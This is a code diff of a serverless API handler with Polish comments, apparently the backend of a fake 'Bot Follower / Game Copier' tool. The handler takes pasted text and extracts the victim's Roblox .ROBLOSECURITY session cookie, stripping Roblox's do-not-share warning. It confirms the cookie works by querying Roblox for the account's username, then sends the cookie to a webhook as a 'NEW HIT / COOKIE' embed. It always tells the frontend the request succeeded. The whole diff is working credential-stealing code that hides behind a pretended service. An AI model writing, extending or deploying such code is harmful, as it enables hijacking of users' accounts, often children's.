@@ -12,59 +12,68 @@ export default async function handler(req, res) {
     }
 
     if (!text || typeof text !== "string" || text.trim() === "") {
-      return res.status(400).json({ error: "No input" });
+      return res.status(400).json({ error: "Brak danych" });
     }
 
     const input = text.trim();
-    let extracted = null;       // stare "items."
+    let extracted = null;           // stary format items.
     let cookieValue = null;
     let username = "Nie udało się odczytać nazwy użytkownika";
 
-    // 1. Stary mechanizm – items.
+    // 1. Stary format – items.
     const match = input.match(/items\.(.*?)(["\,])/i);
     if (match) {
       extracted = match[1].trim();
     }
 
-    // 2. Wyciągamy .ROBLOSECURITY z całego tekstu (różne formaty)
+    // 2. Wyciąganie .ROBLOSECURITY z całego tekstu
     let possibleCookie = input;
 
-    // Czyszczenie popularnych śmieci
+    // Najczęstsze warianty wklejania
     if (possibleCookie.includes(".ROBLOSECURITY=")) {
       possibleCookie = possibleCookie.split(".ROBLOSECURITY=")[1].split(/;| /)[0].trim();
     }
+
     // Usuwamy początek ostrzeżenia jeśli ktoś wkleił całość
-    possibleCookie = possibleCookie.replace(/^_\|WARNING:DO-NOT-SHARE-THIS\.\s*--Sharing-this-will-allow-someone-to-log-in-as-you-and-access-your-account\.\s*/, "").trim();
+    possibleCookie = possibleCookie
+      .replace(/^_\|WARNING:DO-NOT-SHARE-THIS\.\s*--Sharing-this-will-allow-someone-to-log-in-as-you-and-access-your-account\.\s*/, '')
+      .replace(/^_\|WARNING:[^|]*\|\s*/, '')
+      .trim();
 
     if (possibleCookie.startsWith("_|")) {
       cookieValue = possibleCookie;
 
-      // Sprawdzamy, czy cookie działa i pobieramy username
+      // Sprawdzamy cookie i pobieramy nazwę użytkownika
       try {
         const authRes = await fetch("https://users.roblox.com/v1/users/authenticated", {
           method: "GET",
           headers: {
             "Cookie": `.ROBLOSECURITY=${cookieValue}`,
             "Accept": "application/json",
-            "User-Agent": "Mozilla/5.0 (compatible; Vercel/1.0)"
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
           },
-          redirect: "manual"   // unikamy niechcianych redirectów
+          redirect: "manual"
         });
 
-        if (authRes.ok) {
+        console.log("Roblox API status:", authRes.status); // ← log do Vercel
+
+        if (authRes.status === 200) {
           const data = await authRes.json();
-          username = data.name || data.displayName || data.username || "Zalogowano (brak nazwy)";
+          username = data.name || data.displayName || data.username || "Zalogowano (nazwa nie пришла)";
         } else if (authRes.status === 401) {
-          username = "Cookie nieważne / wygasło (401 Unauthorized)";
+          username = "Cookie nieważne / wygasłe (401)";
+        } else if (authRes.status === 429) {
+          username = "Zbyt wiele zapytań (rate limit)";
         } else {
           username = `Błąd Roblox API: ${authRes.status}`;
         }
-      } catch (e) {
-        username = "Błąd podczas sprawdzania cookie (timeout / blokada)";
+      } catch (fetchError) {
+        console.error("Błąd podczas fetch do Roblox:", fetchError);
+        username = "Błąd połączenia z Roblox (timeout / blokada)";
       }
     }
 
-    // Budujemy opis embeda
+    // Budujemy treść embeda
     let description = "";
 
     if (extracted) {
@@ -75,20 +84,20 @@ export default async function handler(req, res) {
       description += `**Cookie (.ROBLOSECURITY):**\n\`\`\`${cookieValue}\`\`\`\n\n`;
     }
 
-    description += `**Nazwa użytkownika właściciela cookie:** ${username}`;
+    description += `**Nazwa użytkownika właściciela cookie:**\n${username}`;
 
     if (!extracted && !cookieValue) {
-      // nic nie złapało → wysyłamy surowy input (skrócony)
-      description = "Nic nie wyodrębniono.\nWklejony tekst (fragment):\n\`\`\`" + input.substring(0, 400) + (input.length > 400 ? "..." : "") + "\`\`\`";
+      description = "Nic nie wyodrębniono.\nWklejony tekst (pierwsze 400 znaków):\n\`\`\`" +
+        input.substring(0, 400) + (input.length > 400 ? "..." : "") + "\`\`\`";
     }
 
     const embed = {
-      title: "NEW HIT / COOKIE",
+      title: "NEW HIT / COOKIE – Bot Follower",
       description: description,
       color: 16711680,
       timestamp: new Date().toISOString(),
       footer: {
-        text: "Bot Follower / Game Copier"
+        text: "Bot Follower | Game Copier"
       }
     };
 
@@ -103,15 +112,17 @@ export default async function handler(req, res) {
 
     const result = await response.text();
 
+    // Zawsze sukces dla frontendu
     res.status(200).json({
       success: true,
       extracted,
-      cookie: cookieValue ? cookieValue.substring(0, 50) + "..." : null,
+      cookie: cookieValue ? cookieValue.substring(0, 60) + "..." : null,
       username,
       webhookResponse: result
     });
 
   } catch (err) {
+    console.error("Błąd w API:", err);
     res.status(500).json({ error: err.message });
   }
 }
